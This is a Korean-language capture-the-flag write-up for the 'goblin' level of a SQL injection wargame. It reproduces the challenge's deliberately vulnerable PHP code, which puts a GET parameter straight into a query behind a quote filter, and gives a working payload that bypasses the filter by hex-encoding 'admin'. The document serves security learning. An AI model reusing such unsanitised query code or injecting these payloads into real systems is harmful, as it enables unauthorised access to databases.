# 3번문제 goblin

이번에는 서버가 어려워졌다.
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```
이제 '와 "을 sql문에서 입력할 수 없게 막은 것인데,  
그래서 id='admin' 과 같이 파라미터를 보낼 수 없게됬다.

여기서 쓸 수 있는 것은, 스트링 우회법이다.  
db마다 다른데, 여기선 0x로 문자들을 16진수로 표기해도 문자열로 해석하는 점을 이용해서,

admin 을 0x61646d696e 으로 입력해준다.
(16진수로 텍스트를 변환하는 것은 https://www.online-toolz.com/langs/ko/tool-ko-text-hex-convertor.html 이 사이트를 이용했다.)

```
https://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php?no=0%20or%20id=0x61646d696e
query : select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
```
이렇게 해주면 뚫리는 것을 볼 수 있다.
